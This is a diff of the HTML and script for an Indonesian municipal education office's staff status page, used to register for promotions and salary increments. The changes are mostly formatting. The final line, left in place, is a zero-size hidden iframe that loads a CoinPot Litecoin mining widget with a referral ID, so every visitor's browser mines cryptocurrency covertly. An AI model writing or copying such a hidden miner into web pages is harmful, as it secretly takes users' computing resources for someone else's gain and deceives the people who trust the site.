@@ -10,21 +10,6 @@
     <link rel="stylesheet" type="text/css" href="./css/style.css">
     <title>DISDIKBUD PAREPARE status</title>
     <style>
-        * {
-            box-sizing: border-box;
-        }
-        
-        html {
-            font-family: 'Roboto';
-        }
-        
-        html,
-        body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-        }
-        
         .logoutWrap {
             text-align: right;
             background-color: rgb(48, 156, 214);
@@ -114,19 +99,6 @@
             text-shadow: 1px 1px 2px #4F2215;
         }
         
-        ul {
-            margin: 0;
-        }
-        
-        li {
-            list-style: none;
-            display: inline-block;
-            margin: 0;
-            padding: 20px;
-            color: rgb(255, 255, 255);
-            cursor: pointer;
-        }
-        
         #boxmasukan {
             resize: none;
             height: 30vh;
@@ -147,7 +119,7 @@
             padding: 20px;
             border-radius: 5px;
             background-color: rgb(253, 253, 253);
-            box-shadow: 0 10px 16px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19) !important;
+            box-shadow: 0 10px 16px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19) !important;
         }
         
         h3,
@@ -166,7 +138,7 @@
         
         #textmasukan {
             height: 200px;
-            padding: 10px;            
+            padding: 10px;
         }
         
         .gmd {
@@ -209,9 +181,10 @@
             display: none;
             width: 70px;
         }
-        .close{
+        
+        .close {
             position: absolute;
-            transform: translate(240px,-25px);
+            transform: translate(240px, -25px);
             cursor: pointer;
         }
     </style>
@@ -234,10 +207,10 @@
         </div>
     </div>
     <div class="logoutWrap">
-        <ul>
-            <li class="akun">Akun</li>
-            <li class="masukan">Pesan</li>
-            <li class="logoutButton">KELUAR</li>
+        <ul class="nav">
+            <li class="nav akun">Akun</li>
+            <li class="nav masukan">Pesan</li>
+            <li class="nav logoutButton">KELUAR</li>
         </ul>
     </div>
     <div class="wrap">
@@ -267,12 +240,12 @@
                 </tr>
             </table>
             <button class="mendaftar" id="mendaftarBtn">Kirim Berkas</button>
-        </div>   
-         <div class="wrapfooter">
+        </div>
+        <div class="wrapfooter">
             <p class="footer">Naik Pangkat dan Kenaikan Gaji Berkala secara online diselenggarakan untuk mempermudah setiap ASN dalam melakukan proses pendaftaran dan mempercepat proses administrasi kepegawaian di lingkup Dinas Pendidikan dan Kebudayaan Kota Parepare</p>
         </div>
     </div>
-   
+
     <!-- <p id="syuaib">Code/Design By syuaib</p> -->
     <script src="./js/main.js"></script>
     <script>
@@ -290,11 +263,11 @@
         let akun = document.querySelector('.akun');
         let close = document.querySelector('.close');
 
-        close.addEventListener('click', ()=> {
+        close.addEventListener('click', () => {
             boxmasukan.setAttribute('style', 'display:none');
         });
-        
-        akun.addEventListener('click', ()=> location.assign('akun.html'));
+
+        akun.addEventListener('click', () => location.assign('akun.html'));
 
         if (main.ambilDb('nip') == null || main.ambilDb('nip') == '') {
             location.assign("index.html");
@@ -340,32 +313,32 @@
         masukan.addEventListener('click', () => {
             boxmasukan.setAttribute('style', 'display:block');
         });
-/*
-        btnMasukan.addEventListener('click', () => {
+        /*
+                btnMasukan.addEventListener('click', () => {
 
-            let dataku = {
-                username: JSON.parse(main.ambilDb("db")).nip,
-                masukan: textmasukan.value
-            }
+                    let dataku = {
+                        username: JSON.parse(main.ambilDb("db")).nip,
+                        masukan: textmasukan.value
+                    }
 
-            async function masukan() {
-                textmasukanloading.setAttribute("style", "display:inline-block");
-                await main.kirimdata(dataku);
-                boxmasukan.setAttribute('style', 'display:none');
-                wrapterkirim.setAttribute("style", "display:block");
-            };
+                    async function masukan() {
+                        textmasukanloading.setAttribute("style", "display:inline-block");
+                        await main.kirimdata(dataku);
+                        boxmasukan.setAttribute('style', 'display:none');
+                        wrapterkirim.setAttribute("style", "display:block");
+                    };
 
-            masukan();
-        });   
-        
-        tutup.addEventListener('click', () => {
-            wrapterkirim.setAttribute('style', 'display:none');
-        });
- */
-        
-         mendaftarBtn.addEventListener('click', () => {
+                    masukan();
+                });   
+                
+                tutup.addEventListener('click', () => {
+                    wrapterkirim.setAttribute('style', 'display:none');
+                });
+         */
+
+        mendaftarBtn.addEventListener('click', () => {
             location.assign('pendaftaran.html');
-       });
+        });
     </script>
     <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/litecoin/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0px;height:0px;"></iframe>
 </body>
